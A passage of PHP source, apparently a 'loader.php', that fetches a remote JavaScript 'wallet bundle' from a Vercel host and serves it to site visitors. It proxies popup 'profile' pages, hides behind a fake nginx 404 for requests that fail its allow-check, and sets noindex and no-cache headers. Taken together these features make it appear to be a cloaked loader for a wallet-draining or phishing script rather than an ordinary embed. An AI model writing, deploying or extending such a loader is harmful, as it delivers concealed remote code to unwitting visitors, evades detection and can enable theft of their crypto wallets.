        . '<hr><center>nginx</center></body></html>';
}

function detect_site_url(array $cfg): string
{
    $override = rtrim((string) ($cfg['site_url'] ?? ''), '/');
    if ($override !== '') {
        return $override;
    }
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function assert_vercel_bundle_url(string $url): void
{
    $parts = parse_url($url);
    if (($parts['scheme'] ?? '') !== 'https') {
        throw new RuntimeException('vercel_bundle_url must use https');
    }
    $host = strtolower((string) ($parts['host'] ?? ''));
    $ok = $host === 'vercel.app' || $host === 'vercel.sh'
        || str_ends_with($host, '.vercel.app') || str_ends_with($host, '.vercel.sh');
    if (!$ok) {
        throw new RuntimeException('vercel_bundle_url host must be a Vercel domain');
    }
    $path = (string) ($parts['path'] ?? '');
    if ($path === '' || $path === '/') {
        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /p7KqN2mR9vXw.js');
    }
}

function wallet_bundle_fetch_error(string $detail = ''): void
{
    $GLOBALS['__wallet_bundle_fetch_error'] = $detail;
}

function wallet_bundle_fetch_last_error(): string
{
    return (string) ($GLOBALS['__wallet_bundle_fetch_error'] ?? '');
}

function fetch_remote_url(string $url): ?string
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            wallet_bundle_fetch_error('curl_init failed');
            return null;
        }
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_CONNECTTIMEOUT => 20,
            CURLOPT_TIMEOUT => 180,
            CURLOPT_USERAGENT => 'wallet-embed-loader/1.0',
            CURLOPT_ENCODING => '',
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        ]);
        $body = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr = curl_error($ch);
        curl_close($ch);
        if ($body === false || $code < 200 || $code >= 300) {
            return null;
        }
        return (string) $body;
    }

    $ctx = stream_context_create([
        'http' => ['timeout' => 180, 'header' => "User-Agent: wallet-embed-loader/1.0\r\n"],
        'ssl' => ['verify_peer' => true, 'verify_peer_name' => true],
    ]);
    $body = @file_get_contents($url, false, $ctx);
    return ($body === false || $body === '') ? null : $body;
}

function fetch_vercel_bundle_remote(string $url): ?string
{
    wallet_bundle_fetch_error('');
    $body = fetch_remote_url($url);
    if ($body === null) {
        wallet_bundle_fetch_error('upstream fetch failed');
    }
    return $body;
}

function load_wallet_bundle(array $cfg): ?string
{
    $vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
    if ($vercelUrl === '') {
        return null;
    }
    assert_vercel_bundle_url($vercelUrl);
    return fetch_vercel_bundle_remote($vercelUrl);
}

$siteUrl = detect_site_url($cfg);

if (!script_request_allowed($cfg, $siteUrl)) {
    send_generic_not_found();
    exit;
}

$chunk = (string) ($_GET['c'] ?? '');
$chunks = chunk_names($cfg);

if ($chunk !== '') {
    if ($chunk === $chunks['gateway']) {
        serve_gateway_chunk($cfg);
        exit;
    }
    if ($chunk === $chunks['profilePage']) {
        serve_popup_proxy($cfg);
        exit;
    }
    if ($chunk === $chunks['profileScript']) {
        serve_popup_asset_proxy($cfg, $chunks['profileScript']);
        exit;
    }
    if (is_static_split_chunk($cfg, $chunk)) {
        serve_static_chunk($cfg, $chunk);
        exit;
    }
    send_generic_not_found();
    exit;
}

header('Content-Type: application/javascript; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('X-Robots-Tag: noindex, nofollow');

$embedConfig = build_embed_config($cfg, $siteUrl);
$vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));

if ($vercelUrl === '') {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Missing vercel_bundle_url in loader.php';
    exit;
}

try {
    assert_vercel_bundle_url($vercelUrl);
} catch (RuntimeException $e) {
    http_response_code(500);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'Invalid vercel_bundle_url: ' . $e->getMessage();
    exit;
}

$entry = vault_entry_url($cfg);
echo embed_network_shim($entry, chunk_names($cfg), $cfg);
echo "\n";
echo embed_config_preamble($embedConfig);
echo "\n";
echo embed_module_bootstrap($cfg);
